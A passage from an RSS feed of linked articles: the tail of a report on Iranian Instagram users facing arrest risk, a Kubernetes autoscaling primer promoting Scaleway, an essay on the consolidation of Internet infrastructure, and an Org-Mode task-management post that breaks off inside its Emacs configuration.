				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/11/h_23.00002805-40x27.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/11/h_23.00002805-768x432.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/11/h_23.00002805-400x267.jpg 400w, https://restofworld.org/wp-content/uploads/2020/11/h_23.00002805-600x400.jpg 600w, https://restofworld.org/wp-content/uploads/2020/11/h_23.00002805-1000x667.jpg 1000w, https://restofworld.org/wp-content/uploads/2020/11/h_23.00002805-1600x1067.jpg 1600w, https://restofworld.org/wp-content/uploads/2020/11/h_23.00002805-2800x1867.jpg 2800w, " sizes="(max-width: 640px) 100vw, 600px(max-width: 992px) calc(100vw - 40px), (max-width: 1140px) calc(100vw - 290px), calc(100vw - ((100vw - 640px)/2))" alt="Two women take a selfie  on a hill overlooking Tehran, Iran in 2020.">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				<span itemprop="copyrightHolder">Armin Karami/MEI/Redux</span>
			</figcaption>
		</figure>


<h3><strong>To post or not to post</strong></h3>



<p>Milad and Roya, who follow each other on Instagram, are becoming acutely aware of the influence that a global platform like Instagram can have. “The dynamics are definitely shifting a bit because people now realize that they can use their voices and their accounts for a good cause,” said Roya.&nbsp;</p>



<p>In Iran, however, doing so comes with a risk of arrest and imprisonment. “Even if you repost or share something about the protest, you can get in trouble for that if the police come across your page,” said Roya. “But you gotta do what you have to do to support your people and share their voices.”</p>



<p>While murmurs of an Instagram ban have been around since its arrival in Iran, they’ve taken on a decidedly <a href="https://www.al-monitor.com/pulse/originals/2020/06/iran-conservative-parliament-ban-instagram.html">more serious tone</a> in the last few months. In June, Mohamed Qomi, chairman of the Islamic Development Organization, <a href="https://www.al-monitor.com/pulse/originals/2020/06/iran-conservative-parliament-ban-instagram.html">launched a tirade</a> in the new hard-line parliament against the social media platform, claiming that it was the source of immorality and a third of the country’s cyber-crime. But shutting down the country’s last open social media network, popular with Iranians of all stripes, could spur the kind of backlash the authorities seek to avoid.&nbsp;</p>



<p>For users like Roya, talks of a ban aren’t cause for concern. “Even if it does get banned, no problem. We have VPNs for Twitter, Facebook, everything else. We’ll just use them for Instagram too.”&nbsp;</p>



<p>But not everyone is as cavalier as Roya. The increased threat of arrest is giving pause to Iranian Instagrammers who once saw the platform as a safe space to post freely.&nbsp;</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/11/bigo_mirror_altered-40x87.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/11/bigo_mirror_altered-600x1066.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2020/11/bigo_mirror_altered-400x866.jpg 400w, https://restofworld.org/wp-content/uploads/2020/11/bigo_mirror_altered-600x1299.jpg 600w, " sizes="(max-width: 640px) 100vw, 300px" alt="" who="" i="" am="" on="" instagram="" is="" closer="" to="" my="" reality="" than="" the="" person="" when="" walk="" streets,"="" said="" roya."="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure>


<p>Vania, a 17-year-old aspiring violinist who created her Instagram account to post videos of her music, saw that her friends were becoming careful of their online activity in the wake of the crackdowns. “One of my friends sings [on Instagram], and she was so worried, she did an encrypted location of another country in the caption so that they wouldn’t think she was Iranian,” Vania told <em>Rest of World</em>. It’s illegal for women to publicly sing in Iran, unless they perform to female-only audiences.&nbsp;</p>



<p>Sahba, an Iranian artist based in Canada, said she has second thoughts before posting to Instagram, even from her home in Vancouver. “I wasn’t really worried until the November protests, when I saw how people were arrested on the streets because of their social media posts,” Sahba said. “I try not to censor myself politically, but it’s something that’s always going to be in my head.”&nbsp;</p>



<p>Roya hopes that her relatively low follower count will protect her …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://restofworld.org/2020/selfies-and-sharia-police/">https://restofworld.org/2020/selfies-and-sharia-police/</a></em></p>]]>
            </description>
            <link>https://restofworld.org/2020/selfies-and-sharia-police/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081599</guid>
            <pubDate>Fri, 13 Nov 2020 12:48:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Understanding Kubernetes Autoscaling – A Primer]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081447">thread link</a>) | @thechiefio
<br/>
November 13, 2020 | https://thechief.io/c/scaleway/understanding-kubernetes-autoscaling/ | <a href="https://web.archive.org/web/*/https://thechief.io/c/scaleway/understanding-kubernetes-autoscaling/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><p>Kubernetes provides a series of features to ensure your clusters have the right size to handle any type of load. In this blog post, we will look into the different auto-scaling tools provided by Kubernetes and learn the difference between the horizontal pod autoscaler, the vertical pod autoscaler and Kubernetes Nodes autoscaler.</p><p>Developers use Kubernetes to ship faster to their users and respond to their requests as quickly as possible. You design the capacity of your cluster on the estimated load your users will generate on it. But imagine your service went viral, and the number of requests grows faster than you ever imagined. You risk running out of compute resources, your service might slow down, and users may get frustrated.</p><p>When you allocate resources manually, your responses may not be as quick as required by your application's changing needs. This is were Kubernetes Autoscaling comes in: Kubernetes provides multiple layers of autoscaling functionality: Pod-based scaling with the Horizontal Pod Autoscaler and the Vertical Pod Autoscaler, as well as node-based with the Cluster Autoscaler. It automatically scales up your cluster as soon as you need it and scales it back down to its regular size when the load is lower. These layers ensure that each pod and cluster has the right performance to serve your current needs.</p><h3><b>Create Kubernetes clusters in seconds:</b></h3><p><a href="https://console.scaleway.com/register?utm_source=faun&amp;utm_medium=blog&amp;utm_campaign=kubernetes">ðŸ‘‰ Create an account</a></p><h2><b>Kubernetes Architecture</b></h2><p>In Kubernetes, a set of machines for running containerized applications is called <b>Cluster</b>. A cluster contains, at minimum, a <b>Control Plane</b> and one or several <b>Nodes</b>. The control plane maintains the clusters' desired state, such as which applications run on them and which images they use. The nodes are either virtual or physical machines that run the applications and workloads, called <b>Pods</b>. Pods consist of containers that request compute resources such as CPU, Memory, or GPU.</p></div></section><section><div><p><img src="https://static.thechief.io/prod/images/Capture_decran_2020-10-22_a_15.3.width-1024.format-webp.webp" width="1024" height="631" alt="Capture dâ€™eÌ�cran 2020-10-22 aÌ€ 15.38.36.png"></p></div></section><section><div><p>For more information to the different Kubernetes components, refer to our dedicated blog post: <a href="https://blog.scaleway.com/an-introduction-to-kubernetes/"><i>An introduction to Kubernetes</i></a></p><h2><b>Horizontal vs. Vertical Scaling</b></h2></div></section><section><div><p><img src="https://static.thechief.io/prod/images/Capture_decran_2020-10-22_a_15.3.width-1024.format-webp_8dgTO9K.webp" width="1024" height="218" alt="Capture dâ€™eÌ�cran 2020-10-22 aÌ€ 15.39.17.png"></p></div></section><section><div><ul><li><b>Horizontal Scaling</b> means modifying the compute resources of an existing cluster, for example, by adding new nodes to it or by adding new pods by increasing the replica count of pods (Horizontal Pod Autoscaler).</li><li><b>Vertical Scaling</b> means to modify the attributed resources (like CPU or RAM) of each node in the cluster. In most cases, this means creating an entirely new node pool using machines that have different hardware configurations. Vertical scaling on pods means dynamically adjusting the resource requests and limits based on the current application requirements (Vertical Pod Autoscaler).</li></ul><h3><b>Horizontal Pod Autoscaler</b></h3><p>The <a href="https://kubernetes.io/docs/tasks/run-application/horizontal-pod-autoscale/">Horizontal Pod Autoscaler (HPA)</a> is able to scale the number of pods available in a cluster to handle the current computational workload requirements of an application. It determines the number of pods needed based on metrics set by you and applies the creation or deletion of pods based on threshold sets. In most cases, these metrics are CPU and RAM usage, but it is also possible to specify your custom metrics. The HPA checks continuously the CPU and memory metrics generated by the <code>metrics-server</code> installed in the Kubernetes cluster.</p><p>If one of the specified thresholds is met, it updates the number of pod replicas inside the deployment controller. Following the updated number of pod replicas, the deployment controller will scale up or down the number of pods until the number of replicas matches the desired number. In case you want to use custom metrics to define rules on how the HPA handles scaling your pods, your cluster needs to be linked to a time-series database holding the metrics you want to use. Please note that Horizontal Pod Autoscaling can not be applied to objects that can not be scaled like, for example, DaemonSets.</p><h3><b>Vertical Pod Autoscaler</b></h3><p>The <a href="https://github.com/kubernetes/autoscaler/blob/master/vertical-pod-autoscaler/README.md">Vertical Pod Autoscaler (VPA)</a> can allocate more (or less) CPU and memory resources to existing pods to modify the available compute resources for an application. This feature can be useful to monitor and adjust the allocated resources of each pod over its lifetime. The VPA comes with a tool called <i>VPA Recommender</i>, which monitors the current and past resource consumption and use this data to provide recommended CPU and memory resources to be allocated for the containers. The Vertical Pod Autoscaler does not update resource configurations for existing pods. It checks which pods have the correct resource configuration and kills the ones that are not having the recommended configuration so that their controllers can recreate them with the updated configuration.</p><p>When you want to use the HPA and VPA both at the same time to manage your container resources, you may put them in a conflict which each other when using the same metrics (CPU and memory). Both of them will try to solve the situation simultaneously, resulting in a wrong allocation of resources. However, it is possible to use them both if they rely on different metrics. The VPA uses CPU and memory consumption as unique sources to gather the perfect resource allocation, but the HPA can be used with custom metrics so both tools can be used in parallel.</p><h3><b>Kubernetes Nodes Autoscaler</b></h3><p>The Kubernetes Nodes Autoscaler adds or removes nodes in a cluster based on <b>all pods' requested resources</b>. It is possible to define a minimum and a maximum number of nodes available to the cluster from the <a href="https://console.scaleway.com/register?utm_source=faun&amp;utm_medium=blog&amp;utm_campaign=kubernetes">Scaleway Elements console</a>.</p><p>While the Horizontal and Vertical Pod Autoscalers allow you to scale pods, the Kubernetes Node Autoscaler scales your clusters nodes, based on the number of pending pods. The CA checks to see whether there are any pending pods and increases the cluster's size so that these pods can be created. It also deallocates idle nodes to keep the cluster at the optimal size. The Nodes Autoscaler can request to deploy new nodes directly in your pool, within the given resource limits (if any).</p><p><b>Cluster upscaling</b><br>If pods are scheduled for execution, the Kubernetes Autoscaler can increase the number of machines in the cluster to avoid resource shortage. The diagram below illustrates how a cluster can be automatically upscaled:</p></div></section><section><div><p><img src="https://static.thechief.io/prod/images/Capture_decran_2020-10-22_a_15.4.width-1024.format-webp.webp" width="1024" height="674" alt="Capture dâ€™eÌ�cran 2020-10-22 aÌ€ 15.40.40.png"></p></div></section><section><div><p>As illustrated, two pods are scheduled for execution but the current node's compute capacity is reached. The cluster autoscaler automatically scans all nodes for scheduled pods. It requests provision of a new node if three conditions are met:</p><ul><li>Some pods failed to schedule on any of the existing nodes due to insufficient available resources.</li><li>Adding a node with the same specifications as the current ones help to redistribute the load.</li><li>The cluster has not reached the user-defined maximum node count.</li></ul><p>Once the node is deployed and detected by the Kubernetes Control Plane, the scheduler allocates the pending pods to the cluster's new node. In case there are still some pending pods, the autoscaler repeats these steps as often as required.</p><p><b>Cluster downscaling</b><br>The Kubernetes Cluster Autoscaler decreases the number of nodes in a cluster when some are considered not necessary for a pre-defined amount of time. To be considered unnecessary, a node must have low utilization, and all of its important pods can be moved elsewhere without resource shortage. The node scaledown check takes into account the resource requests made by the pods, and if the Kubernetes scheduler decides that the pods can be moved somewhere else, it removes the node from the cluster to optimize resource usage and to reduce costs. If you have defined a minimum number of active nodes in the cluster, the autoscaler will not reduce the number of nodes below this threshold.</p><h2><b>Configuring Autoscaling</b></h2><p>You can configure <b>Cluster Autoscaling</b> directly from your <a href="https://console.scaleway.com/register?utm_source=faun&amp;utm_medium=blog&amp;utm_campaign=kubernetes">Scaleway Elements</a> console.</p><p><b>During Cluster creation:</b><br>To enable Kubernetes Cluster Autoscaling during the creation of a new cluster, head to step 5 in the cluster creation form, toggle the switch, and set the minimum and maximum resources available for your cluster:</p></div></section><section><div><p><img src="https://static.thechief.io/prod/images/Capture_decran_2020-10-22_a_15.4.width-1024.format-webp_qeW7ln8.webp" width="1024" height="452" alt="Capture dâ€™eÌ�cran 2020-10-22 aÌ€ 15.41.40.png"></p></div></section><section><div><p><b>On an existing Cluster:</b></p><ol><li>From your cluster information page, click on the <b>Pools</b> tab and select the pool to modify. Click <b>Edit</b> in the pools drop-down menu to configure the pool:</li></ol></div></section><section><div><p><img src="https://static.thechief.io/prod/images/Capture_decran_2020-10-22_a_15.4.width-1024.format-webp_xc3CXr1.webp" width="1024" height="238" alt="Capture dâ€™eÌ�cran 2020-10-22 aÌ€ 15.43.11.png"></p></div></section><section><p>2. Toggle on the <b>Autoscale the number of nodes</b> switch and set the desired number of minimum and maximum resources available for the pool:</p></section><section><div><p><img src="https://static.thechief.io/prod/images/Capture_decran_2020-10-22_a_15.4.width-1024.format-webp_mpliKry.webp" width="1024" height="1284" alt="Capture dâ€™eÌ�cran 2020-10-22 aÌ€ 15.44.21.png"></p></div></section><section><div><ol><li>Confirm the the modification of the pool by clicking on <b>Update pool.</b></li></ol><h2><b>Conclusion</b></h2><p>You now understand the basics of Kubernetes Autoscaling features and how you can use them to configure your cluster for maximum performances.</p><p>Deploy your first <a href="https://console.scaleway.com/register?utm_source=faun&amp;utm_medium=blog&amp;utm_campaign=kubernetes">Kubernetes Kapsule Cluster</a> directly from your Scaleway console and try out the Autoscaling feature.</p></div></section><section><div><h4><b>Article written by</b></h4><h4><a href="https://medium.com/@olgapetrova_92798"><b>Olga Petrova</b></a></h4><p>Quantum physicist turned Machine Learning engineer. Currently doing AI for @Scaleway, a French cloud provider. <a href="https://www.linkedin.com/in/olga-p-petrova/">Her linkedIn</a>.</p></div></section></div></div>]]>
            </description>
            <link>https://thechief.io/c/scaleway/understanding-kubernetes-autoscaling/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081447</guid>
            <pubDate>Fri, 13 Nov 2020 12:22:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Origins of the Internet: The Backbone]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081374">thread link</a>) | @chmaynard
<br/>
November 13, 2020 | https://technicshistory.com/2020/11/13/the-backbone-conclusion/ | <a href="https://web.archive.org/web/*/https://technicshistory.com/2020/11/13/the-backbone-conclusion/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>And so we reach the conclusion of “The Backbone,” my story of the origins of the Internet<a href="#fn1" id="fnref1"><sup>1</sup></a>. We have seen the basic arc of the Internet’s development from the 1960s to the 1990s – nurtured in its youth by the government, given room to grow to fruition by the unravelling of the power of the Bell system, and finally emerging into public view in a frenzy of growth which smothered all potential competitors. Over the course of those decades, users repeatedly co-opted systems built in order to expand and share access to machine resources (time-sharing operating systems, ARPANET, and NSFNET), to use them instead for interpersonal communication – message boards and electronic mail.</p>
<p>In 1995, the National Science Foundation (NSF) successfully extricated itself from the network operations business while preserving a single, unitary Internet, composed of many heterogeneous but interlaced parts – networks owned by a variety of corporations; and websites and other services provided by an even wider variety of participants: hobbyists, local governments, small businesses, and more.</p>
<p>The Internet’s self-image coalesced in these years of its adolescence. It was distributed, decentralized, and decentralizing. Its most vocal proponents argued that its technological structure, which privileged the edges over the center, would replicate itself in new political structures, eroding the foundations of incumbent institutional power and enabling direct, disintermediated communication and market transactions between individuals. Louis Rossetto, editor of <em>Wired</em>, <em>the</em> magazine of the technologically-enlightened, put it this way:</p>
<blockquote>
<p>This new world is characterized by a new global economy which is inherently anti-hierarchical and decentralist, and disrespects national boundaries or the control of politicians and bureaucrats or power mongerers of any; and by a global, networked consciousness that is creating a new kind of democracy for achieving social consensus that is turning the bankrupt electoral politics we are witnessing this year into a dead end. …a global hive mind that is arriving at a new, spontaneous order<a href="#fn2" id="fnref2"><sup>2</sup></a>.</p>
</blockquote>
<p>This set of libertarian ideas found expression in statements repeated and replicated so often that they became a kind of scripture of the Internet: the book of David Clark (“We reject: kings, presidents, and voting. We believe in: rough consensus and running code.”); the book of John Perry Barlow (“Governments of the Industrial World, you weary giants of flesh and steel, I come from Cyberspace, the new home of Mind. ….You are not welcome among us. You have no sovereignty where we gather.”); the book of John Gilmore (“The Net interprets censorship as damage and routes around it.”).</p>
<p>These ideas took root, as I have said, when the Internet remained yet in its adolescent state – simultaneously a single, interconnected system, yet robustly heterogeneous in its structure at every level. Over the following fifteen years, its heterogeneity would diminish, with power over the network and its applications consolidating in a few key corporations<a href="#fn3" id="fnref3"><sup>3</sup></a>.</p>
<h2 id="boom-networks-consolidate">Boom: Networks Consolidate</h2>
<p>As the popularity of the Internet exploded in the second half of the 1990s, a river of capital flowed into Silicon Valley in search of the huge returns promised by the unheard of yearly growth of digital traffic. The theory of the time held that, because of the global reach of the Internet and the power of network effects (e.g., Metcalfe’s Law), the first mover to occupy any given sector of online business would dominate it. According to this doctrine, short-term losses – even on per-unit sales basis – were irrelevant, even desirable. Only growth mattered, because growth could always be turned into profits later, once all potential competitors had dwindled into irrelevance<a href="#fn4" id="fnref4"><sup>4</sup></a>. This encouraged a gold rush mentality among investors, what we would now call FOMO, and attracted large amounts of money to such questionable enterprises as Priceline, Boo, and eToys, despite their evident lack of profitability.</p>
<p>Underneath this highly visible froth of increased application diversity, however, the deep current of network infrastructure flowed in the opposite direction, towards consolidation. The boom in web properties in the second half of the 1990s found its echo in a boom in fiber optic network construction. The telecom carriers, new and old, all wanted a piece of the exponential growth in data traffic promised by the rocket-like rise of the World Wide Web. The incumbent telecommunications carriers, freed from their silos by the 1996 Telecom Act, did not, as might have been hoped, use the opportunity to unleash their claws in all-out competitive battle, cutting profits to the bone to the benefit of their users. Markets may thrive on competition, but firms much prefer monopoly. And so the RBOCs and long-distance carriers, split apart in 1984, re-assembled themselves into giants with tremendous market power. Southwestern Bell absorbed Ameritech, Pacific Telesis, BellSouth, and finally AT&amp;T, and then took the name of that former parent company. Bell Atlantic and NYNEX merged, then acquired GTE<a href="#fn5" id="fnref5"><sup>5</sup></a>, taking on at the same time a new moniker, Verizon. Of the former RBOCs, only US West remained an independent company.</p>
<p>While Southwestern Bell and Bell Atlantc re-assembled the scattered parts of AT&amp;T into a pair of Frankenstein’s monsters, another would-be giant was busy absorbing the various internet service providers that had flourished in the first half of the 1990s. In 1983, Bernie Ebbers, who had made his first fortune as the owner of a dozen hotels, co-founded Long Distance Discount Services (LDDS) to compete in the market newly opened by the AT&amp;T break-up, targeting long-distance service for small and medium-sized businesses. Over the ensuing decade, LDDS acquired a variety of other competitors, achieving fourth place in size among long-distance carriers behind AT&amp;T, MCI, and Sprint. In the first days of the Internet boom, it took on a new name – WorldCom – thus announcing its newly hubristic ambitions. A new, much more extravagant buying spree ensued, using WorldCom’s its bubble-inflated stock to acquire one major network after another. In 1996, it bought Metropolitan Fiber Systems (MFS), which had itself just acquired major Internet provider UUNET. The acquisition of CompuServe’s network infrastructure from H&amp;R block followed in 1997, along with the acquisition of the former NSFNET backbone operator, ANS, from AOL. The biggest purchase of all came in 1998, when WorldCom merged with MCI. After the market crash – and bankruptcy and scandal and prison<a href="#fn6" id="fnref6"><sup>6</sup></a> – Verizon absorbed the wreckage of Bernie Ebbers’ conglomerate in 2006.</p>
<p>Finally, the cable television providers, though more historically localized in ownership than the rest of the telecom business, underwent a similar trend towards consolidation, with acquisitions across previously siloed markets making possible behemoths like Time Warner and Comcast; the latter became simultaneously the largest internet service provider and the largest pay-TV company in the U.S., to say nothing of its media holdings.</p>
<p>And so, by the mid-2000s, the diverse structure of peer networks which had characterized the early Internet in the U.S. had merged into a handful of major providers. At the retail level, as broadband networking replaced dial-up, most consumers had access to only one or two relevant ISPs – their local telephone and cable company – and nationally two companies dominated each of those sectors; Verizon and AT&amp;T on the one hand, and Comcast and Time Warner on the other.</p>
<h2 id="bust-applications-consolidate">Bust: Applications Consolidate</h2>
<p>Many of the first-generation dot-coms might have survived had they been allowed to grow gradually. But the gold rush theory was antithetical to anything but hypergrowth. So, when the crash came, most were caught with huge expenses and excess capacity due to overinvestment, and they quickly collapsed. A vigorous winnowing took place, with a great deal of chaff sifted out and only a few grains of wheat left behind.</p>
<p>Over the following decade, a new much more stable order emerged. Five giant companies came to dominate the application layer of the Internet. Two of them were dot-com era survivors. Google, founded in 1998, had raised the bar on what it meant to be a search engine by extracting ranking information from the structure of the Web and its skein of links, rather than merely from the content of individual pages. Through a series of further innovations and acquisitions, it leveraged its dominance in search into a powerful position in mobile computing, email, streaming video, and, of course, advertising. Amazon, founded as a book retailer in 1994, developed a world-beating logistical operation which it used to undercut competitors on price and delivery speed, then expanded into virtually every retail sector, and finally created a set of tools for hosting third-party applications that defined the new, and very lucrative, business of cloud computing.</p>
<p>Two of the other giants had come of age during the personal computing era, a decade before the commercial Internet. Microsoft took an early lead in the so-called “browser wars” of the mid-90s, but more important long-term was its continued dominance of business software, even as those businesses began to move their operations on-line. Apple Computer, made largely irrelevant in the 1990s by the dominance of Windows, seemed destined to a gradual decline into senescence. But it was rejuvenated by its successes with the iPod and iTunes, and then developed the most profitable mobile computing device to this day, the iPhone.</p>
<p>The final dominant power, Facebook, was the only one to come out of the second wave boom in Internet investment in the second half of the 2000s. It grew rapidly across college campuses before colonizing the wider world, and becoming the primary way that many millions of people keep in touch with people outside their immediate family and close friends. It has since acquired other …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://technicshistory.com/2020/11/13/the-backbone-conclusion/">https://technicshistory.com/2020/11/13/the-backbone-conclusion/</a></em></p>]]>
            </description>
            <link>https://technicshistory.com/2020/11/13/the-backbone-conclusion/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25081374</guid>
            <pubDate>Fri, 13 Nov 2020 12:01:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Org-Mode Workflow: Task Management]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25081372">thread link</a>) | @mromanuk
<br/>
November 13, 2020 | https://whhone.com/posts/org-mode-task-management/ | <a href="https://web.archive.org/web/*/https://whhone.com/posts/org-mode-task-management/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
		<div>
			<div>
			
<main role="main">
	<article>
		<div>
			<p>As mentioned in the <a href="https://whhone.com/posts/from-evernote-to-org-mode/">last post</a>, I switched to Org-Mode.  I kept adjusting my workflow with this new tool and it has been stabilized for a month. I think it is time to talk about the new workflow for task/time management with Org-Mode. This blog post consists of four parts: the principles, the definitions, the workflows, and finally the implementations.</p>
<h2 id="1-the-principles">1 The Principles</h2>
<p>Principles remain valid no matter what the tool is.</p>
<h3 id="11-do-not-add-tasks-indiscriminately">1.1 Do Not Add Tasks Indiscriminately</h3>
<p>Not every task should go into the system. Avoid filling the system with bullshits and hiding the things that matter. I only add tasks that I really want or need to do.</p>
<p>To clarify<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>, the task management system describled below is not the “inbox” in GTD. I still capture things into my inbox but not all of them will be converted to a task in the task management system (org agenda files) eventually.</p>
<h3 id="12-not-all-tasks-have-to-be-done">1.2 Not All Tasks Have To Be Done</h3>
<p>There are two reasons for this. First, tasks could be deprioritized or even become unnecessary. Second, we have limited time and cannot do everything. We should have an opinion on the priority.</p>
<h3 id="13-reduce-the-number-of-open-loop">1.3 Reduce The Number Of Open Loop</h3>
<p>Open loops are tasks that have been started but not finished. They stay in our minds and occupy some of our limited working memory so that we cannot focus on another task we are working on.</p>
<p>Also, open loops reduce agility, according to <a href="https://en.wikipedia.org/wiki/Little%27s_law">Little’s Law</a>. The more the open loops, the longer time finish each of them on average.</p>
<h3 id="14-reduce-decision-making-of-what-to-do-next">1.4 Reduce Decision Making Of What To Do Next</h3>
<p>The system should suggest to the user what to do next so that the user can reserve the will power to the real task. This also avoids skipping hard tasks with easy tasks unconsciously.</p>
<h2 id="2-the-definitions">2 The Definitions</h2>
<p>Each task in Org-Mode has a <a href="https://orgmode.org/manual/Workflow-states.html">TODO keyword</a>, optionally <a href="https://orgmode.org/manual/Deadlines-and-Scheduling.html">a scheduled date, and a deadline</a>. For example,</p>
<div><pre><code data-lang="org">*<span> PROG Write a blog post on task management with Org-Mode</span>
DEADLINE: &lt;<span>2020-11-07 Sat</span>&gt; SCHEDULED: &lt;<span>2020-10-31 Sat</span>&gt;
</code></pre></div><p>Each Org-Mode user could define their own set of TODO keywords and use scheduled dates and deadlines differently. For example, some people use only two TODO keywords, “TODO” and “DONE”, while some use more. Some people set “scheduled dates” to all the tasks while some people set it to some of the tasks. These nuances could result in a very different workflow, although they are using the same Org-Mode. Let’s take a look at how I use them.</p>
<h3 id="21-todo-keywords">2.1 TODO Keywords</h3>
<p>I use as few TODO keywords as possible but not too few. For example, it is common to use only two states (“TODO” and “DONE”) but this does not align with the principles I mentioned above. I need a state for “open loops” so that I can keep the number of them small. I also need to distinguish a smaller set of “next actions” from all tasks.</p>
<p>So far, I defined these five keywords:</p>
<table>
<thead>
<tr>
<th>TODO Keyword</th>
<th>Definition</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>TODO</code></td>
<td><strong>Tasks that are not started and not planned.</strong> They could be the backlogs or the GTD’s someday/maybe. These tasks could be converted to <code>NEXT</code> during a review.</td>
</tr>
<tr>
<td><code>NEXT</code></td>
<td><strong>Tasks that are not started but planned to do as soon as I can.</strong>  When there is no actionable <code>PROG</code> (e.g., blocked), I start one of those and convert it to <code>PROG</code>.</td>
</tr>
<tr>
<td><code>PROG</code></td>
<td><strong>Tasks that are working in progress (open loops).</strong> I work on these tasks before starting another <code>NEXT</code> task to avoid too many open loops at any moment.</td>
</tr>
<tr>
<td><code>INTR</code></td>
<td><strong>The tasks that are interruptions.</strong> They are urgent things that I should drop everything else and work on it. For example, production issues.</td>
</tr>
<tr>
<td><code>DONE</code></td>
<td><strong>The tasks that are completed.</strong></td>
</tr>
</tbody>
</table>
<p>This diagram illustrates the transition of those states.</p>
<pre><code>                                 +------+
                                 | INTR |
                                 +------+
                                    |
                                    v
+------+   +------+   +------+   +------+
| TODO |--&gt;| NEXT |--&gt;| PROG |--&gt;| DONE |
+------+   +------+   +------+   +------+
</code></pre><h3 id="22-scheduled-and-deadline">2.2 Scheduled and Deadline</h3>
<p>In the past, I tended to set a date for all tasks. If I want to do A, B, and C on Monday, then I schedule them for Monday. This sounds very intuitive but, in reality, I ended up rescheduling many incompleted tasks at the end of every day. It was not only wasting time but also depressing.</p>
<p>Later, I changed to rely more on the TODO keywords. For example, if a task is still in progress, I keep the state unchanged as <code>PROG</code> instead of rescheduling it every day until it is done. I am now using the “scheduled date” to hide a task until the date I should look at it again. Similar to the snooze feature in Gmail.</p>
<table>
<thead>
<tr>
<th>Date</th>
<th>Definition</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>SCHEDULED</code></td>
<td>Hide the task until the scheduled date.</td>
</tr>
<tr>
<td><code>DEADLINE</code></td>
<td>The deadline of the task.</td>
</tr>
</tbody>
</table>
<p>For example, when a <code>PROG</code> task is being blocked, I set the <code>SCHEDULED</code> date to hide it until the date I want to revisit. On the scheduled date, if the task is unblocked, I will remove the <code>SCHEDULED</code> date. If the task is still blocked, I reschedule it again. It acts as the <a href="https://hamberg.no/gtd#the-waiting-for-list">waiting for list</a> in GTD.</p>
<h2 id="3-the-workflow">3 The Workflow</h2>
<p>I customize my org agenda view to drive my daily workflow. The customized agenda view has four sections. From the top to bottom, they are the tasks scheduled today, the <code>INTR</code> tasks, the <code>PROG</code> tasks, and finally the <code>NEXT</code> tasks.</p>
<p><img src="https://whhone.com/img/org-agenda.png" alt="Org Agenda"></p>
<p>My daily workflow goes from the top to the bottom.</p>
<h3 id="31-update-tasks-scheduled-today">3.1 Update Tasks Scheduled Today</h3>
<p>At the beginning of the day, I review the tasks that are scheduled for today. The goal here is not to finish them, but to update or remove the scheduled date so that there is nothing left.</p>
<ol>
<li>If the task is still blocked, reschedule it</li>
<li>If the task could be done in a few minutes, then do it and mark it as <code>DONE</code>.</li>
<li>Otherwise, remove the scheduled date and optionally update the TODO keywords.</li>
</ol>
<p>Removing the scheduled date is the best outcome. It indicates the previous estimation was correct, at least not too early. Rescheduling indicates the previous estimation is inaccurate. I would avoid rescheduling the task to tomorrow indiscriminately and try to make a good estimation to reduce the number of rescheduling.</p>
<h3 id="32-find-the-next-task-to-work-on">3.2 Find the Next Task to Work On</h3>
<p>After reviewing all tasks scheduled for today, it is time to pick a task and do some real works. This step is very straight-forward with the customized agenda view above.</p>
<ol>
<li>Pick an <code>INTR</code> task if there is any.</li>
<li>If there is no <code>INTR</code> task, then pick a <code>PROG</code> task and work on it. If that task is blocked, set a <code>SCHEDULED</code> date to hide it.</li>
<li>If there is no <code>INTR</code> and <code>PROG</code> task, then start a <code>NEXT</code> task.</li>
<li>If there is no task in the agenda view, then review the <code>TODO</code> tasks and convert some to <code>NEXT</code>.</li>
</ol>
<h3 id="33-review-the-system">3.3 Review the System</h3>
<p>The secret of having a system that works in the long-term is regular maintenance. I do it at least once a week. For examples,</p>
<ul>
<li>Promote some tasks from <code>TODO</code> to <code>NEXT</code>. Demote or even delete deprioritized tasks.</li>
<li>Review the <a href="https://whhone.com/posts/daily-journal/">journal</a> and add <code>TODO</code> if something needs follow-up.</li>
<li><a href="https://orgmode.org/manual/Archiving.html">Archive</a> completed tasks and extract to permanent notes<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup>.</li>
</ul>
<h2 id="4-the-configuration">4 The Configuration</h2>
<p>Finally, here is the configuration for the above workflow.</p>
<div><pre><code data-lang="lisp"><span>;; Emacs Easy Customization ("M-x customize") syntax is used.</span>
<span>;; If you prefer using .el files directly, set it with "setq".</span>

<span>;; TODO keywords.</span>
<span>'</span>(org-todo-keywords
  <span>'</span>((<span>sequence</span> <span>"TODO(t)"</span> <span>"NEXT(n)"</span> <span>"PROG(p)"</span> <span>"INTR(i)"</span> <span>"DONE(d)"</span>)))

<span>;; Show the daily agenda by default.</span>
<span>'</span>(org-agenda-span <span>'day</span>)

